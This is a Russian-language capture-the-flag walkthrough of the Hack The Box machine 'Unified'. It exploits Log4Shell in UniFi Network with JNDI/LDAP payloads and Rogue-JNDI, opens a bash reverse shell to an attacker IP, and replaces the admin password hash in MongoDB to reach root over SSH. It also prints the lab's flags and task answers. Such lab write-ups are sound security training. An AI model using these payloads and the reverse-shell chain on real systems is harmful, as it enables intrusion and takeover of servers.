# 📘 Hack The Box: Unified

> 🔗 https://app.hackthebox.com/machines/Unified

---

# 🎯 Цель

Получить первоначальный доступ к машине через эксплуатацию уязвимости **Log4Shell (CVE-2021-44228)** в приложении **UniFi Network**, затем повысить привилегии до `root` через MongoDB и административную панель UniFi.

---
# 📑 Содержание

- [🧠 Ключевая идея машины](#ключевая-идея-машины)
- [🧩 Теория: Что такое Log4Shell](#теория-что-такое-log4shell)
- [🧩 Теория: Что такое JNDI](#теория-что-такое-jndi)
- [🧩 Теория: Что такое LDAP](#теория-что-такое-ldap)
- [🔍 Этап 1 — Разведка](#этап-1--разведка)
- [🌐 Этап 2 — Анализ веб-приложения](#этап-2--анализ-веб-приложения)
- [🧪 Этап 3 — Проверка Log4Shell](#этап-3--проверка-log4shell)
- [☕ Этап 4 — Подготовка Rogue-JNDI](#этап-4--подготовка-rogue-jndi)
- [🐚 Этап 5 — Reverse Shell](#этап-5--reverse-shell)
- [⬆️ Этап 6 — Privilege Escalation](#этап-6--privilege-escalation)
- [👑 Этап 7 — Root SSH](#этап-7--root-ssh)
- [📋 Ответы на задания HTB](#ответы-на-задания-htb)
- [🧠 Итоговая цепочка атаки](#итоговая-цепочка-атаки)

---

# 🧠Ключевая идея машины

Машина Unified учит:

- правильной разведке сервисов;
- анализу веб-приложений;
- использованию BurpSuite;
- пониманию Log4Shell;
- работе с JNDI / LDAP;
- получению reverse shell;
- работе с MongoDB;
- изменению password hash;
- privilege escalation через утечку SSH credentials.

Главная идея:

> Уязвимое Java-приложение выполняет JNDI lookup, что позволяет атакующему добиться удалённого выполнения кода.

---

# 🧩Теория: Что такое Log4Shell

Log4Shell — это критическая уязвимость в библиотеке Log4j.

Уязвимость позволяет внедрить payload:

```text
${jndi:ldap://ATTACKER_IP/payload}
```

Когда приложение логирует строку, Log4j пытается выполнить JNDI lookup и подключается к LDAP серверу атакующего.

Если LDAP сервер контролируется атакующим, можно добиться:

- Remote Code Execution;
- reverse shell;
- полной компрометации системы.

---

# 🧩Теория: Что такое JNDI

JNDI (Java Naming and Directory Interface) — это Java API для поиска внешних ресурсов.

JNDI может использовать:

- LDAP
- RMI
- DNS

В Log4Shell чаще всего используется LDAP.

---

# 🧩Теория: Что такое LDAP

LDAP — Lightweight Directory Access Protocol.

LDAP обычно работает на порту:

```text
389
```

В этой машине уязвимое приложение пытается подключиться к LDAP серверу атакующего.

---

# 🔍Этап 1 — Разведка

## Сканирование цели

```bash
export IP=10.129.145.66
nmap -sC -sV -v -oN nmap_initial.txt $IP
```

---

## Что делает каждая часть команды

### `-sC`

Запускает стандартные NSE-скрипты.

Помогает автоматически собирать дополнительную информацию о сервисах.

### `-sV`

Определяет версии сервисов.

Это очень важно, потому что exploit часто зависит от версии приложения.

### `-v`

Verbose mode.

Показывает больше информации в процессе сканирования.

### `-oN`

Сохраняет результат в файл.

Это полезно для отчёта и повторного анализа.

---

# Результат сканирования

```text
22/tcp   open  ssh
8080/tcp open  http
8443/tcp open  ssl/http
6789/tcp open  ibm-db2-admin?
```

Наиболее интересный сервис:

```text
8443/tcp
```

На нём работает:

```text
UniFi Network
```

---

# Как думать после nmap

После обнаружения UniFi нужно задать вопросы:

1. Какая версия приложения?
2. Есть ли известные CVE?
3. Можно ли добиться RCE?
4. Использует ли приложение Java/Log4j?

---

# Этап 2 — Анализ веб-приложения

Открываем:

```text
https://10.129.145.66:8443
```

Видим:

```text
UniFi Network
```

Это важно, потому что уязвимые версии UniFi активно эксплуатировались через Log4Shell.

---

# 🛠️Использование BurpSuite

## Зачем нужен Burp

BurpSuite используется как proxy между браузером и сервером.

Он позволяет:

- перехватывать запросы;
- изменять их;
- повторно отправлять;
- тестировать payload.

---

# Открытие встроенного браузера

В Burp:

```text
Proxy → Open Browser
```

Использование встроенного браузера удобно потому что:

- HTTPS уже настроен;
- сертификаты уже доверенные;
- interception работает сразу.

---

# Перехват login-запроса

Включаем:

```text
Proxy → Intercept → ON
```

Вводим тестовые данные:

```text
test:test
```

Burp перехватывает:

```http
POST /api/login
```

---

# Отправка запроса в Repeater

```text
CTRL + R
```

Зачем нужен Repeater:

- позволяет многократно отправлять запрос;
- удобно тестировать payload;
- можно быстро изменять параметры.

---

# Этап 3 — Проверка Log4Shell

## Запуск tcpdump

```bash
sudo tcpdump -i tun0 port 389
```

---

# Что делает команда

### `tcpdump`

Перехватывает сетевой трафик.

### `-i tun0`

Слушает VPN интерфейс HTB.

### `port 389`

Фильтрует LDAP трафик.

---

# Payload

В JSON изменяем:

```json
"remember":"${jndi:ldap://10.10.17.101/test}"
```

---

# Почему используется поле remember

Приложение логирует содержимое этого поля.

Если Log4j обрабатывает строку, payload выполняется.

---

# Ответ приложения

```text
api.err.InvalidPayload
```

Это нормально.

Главное — LDAP callback.

---

# Подтверждение уязвимости

В tcpdump появляется:

```text
10.129.145.66 -> 10.10.17.101:389
```

Это означает:

- payload обработан;
- JNDI lookup выполнен;
- приложение уязвимо.

---

# Этап 4 — Подготовка Rogue-JNDI

## Установка Java и Maven

```bash
sudo apt install openjdk-11-jdk maven -y
```

---

# Что такое Maven

Maven — инструмент сборки Java проектов.

Он нужен для сборки Rogue-JNDI.

---

# Скачивание Rogue-JNDI

```bash
git clone https://github.com/veracode-research/rogue-jndi
cd rogue-jndi
mvn package
```

---

# Что делает mvn package

Команда:

```bash
mvn package
```

Компилирует проект и создаёт `.jar` файл.

---

# Результат

```text
target/RogueJndi-1.1.jar
```

---

# Этап 5 — Reverse Shell

## Создание payload

```bash
echo 'bash -c bash -i >&/dev/tcp/10.10.17.101/4444 0>&1' | base64 -w 0
```

---

# Почему используется base64

Base64 помогает:

- избежать проблем с символами;
- корректно передать payload через Java/LDAP;
- уменьшить вероятность ошибок parsing.

---

# Запуск Rogue-JNDI

```bash
java -jar target/RogueJndi-1.1.jar \
--command "bash -c {echo,BASE64}|{base64,-d}|{bash,-i}" \
--hostname "10.10.17.101"
```

---

# Что делает Rogue-JNDI

Он:

- поднимает LDAP сервер;
- отвечает на JNDI запросы;
- заставляет сервер выполнить команду.

---

# Listener

В отдельном терминале:

```bash
nc -lvnp 4444
```

---

# Что делает netcat

`nc` слушает порт:

```text
4444
```

и принимает reverse shell.

---

# Финальный exploit payload

```json
"remember":"${jndi:ldap://10.10.17.101:1389/o=tomcat}"
```

---

# Получение shell

После отправки payload:

```text
connect to [10.10.17.101] from [10.129.145.66]
```

---

# Проверка доступа

```bash
whoami
id
```

Результат:

```text
unifi
uid=999(unifi)
```

---

# Upgrade shell

```bash
script /dev/null -c bash
```

---

# User flag

```bash
cd /home/michael
cat user.txt
```

---

## 🔐User Flag

<details>
<summary>Показать user flag</summary>

6ced1a6a89e666c0620cdb10262ba127

</details>

---

# Этап 6 — Privilege Escalation

## Проверка MongoDB

```bash
ps aux | grep mongo
```

---

# Что мы узнаём

MongoDB работает локально:

```text
127.0.0.1:27117
```

---

# Почему MongoDB важна

UniFi хранит пользователей в MongoDB.

Если мы можем изменять данные — можем заменить password hash администратора.

---

# Подключение к MongoDB

```bash
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
```

---

# Что делает команда

### `ace`

База данных UniFi.

### `db.admin.find()`

Выводит пользователей.

---

# Находим администратора

```text
administrator
```

---

# Генерация нового SHA-512 hash

```bash
openssl passwd -6 Password1234
```

---

# Почему SHA-512

UniFi хранит пароли в формате:

```text
$6$
```

Это означает SHA-512.

---

# Замена hash

```bash
mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"NEW_HASH"}})'
```

---

# Что делает update()

Функция:

```text
db.admin.update()
```

изменяет данные пользователя в MongoDB.

---

# Вход в UniFi

```text
administrator
Password1234
```

---

# Поиск SSH credentials

Переходим:

```text
Settings → Site → SSH Authentication
```

Находим root password.

---

## 🔐Root Password

<details>
<summary>Показать пароль</summary>

NotACrackablePassword4U2022

</details>

---

# Этап 7 — Root SSH

```bash
ssh root@10.129.145.66
```

---

# Root flag

```bash
cat /root/root.txt
```

---

## 🔐Root Flag

<details>
<summary>Показать root flag</summary>

e50bc93c75b634e4b272d2f771c33681

</details>

---

# 📋Ответы на задания HTB

<details>
<summary>Показать ответы</summary>

1. ldap
2. tcpdump
3. 389
4. 27117
5. ace
6. db.admin.find()
7. db.admin.update()
8. NotACrackablePassword4U2022

</details>

---

# 🧠Итоговая цепочка атаки

```text
nmap
→ UniFi
→ Log4Shell
→ JNDI LDAP callback
→ Rogue-JNDI
→ reverse shell
→ MongoDB enumeration
→ password hash replacement
→ UniFi admin access
→ SSH credential disclosure
→ root SSH
```

---

# 📚Чему учит машина [⬆️ Наверх](#-содержание)

Unified — одна из лучших beginner/intermediate машин для понимания:

- Log4Shell;
- JNDI exploitation;
- LDAP callback;
- reverse shell;
- MongoDB;
- password hash replacement;
- attack chain thinking.

Главный урок:

> Даже одна уязвимость логирования может привести к полной компрометации инфраструктуры.
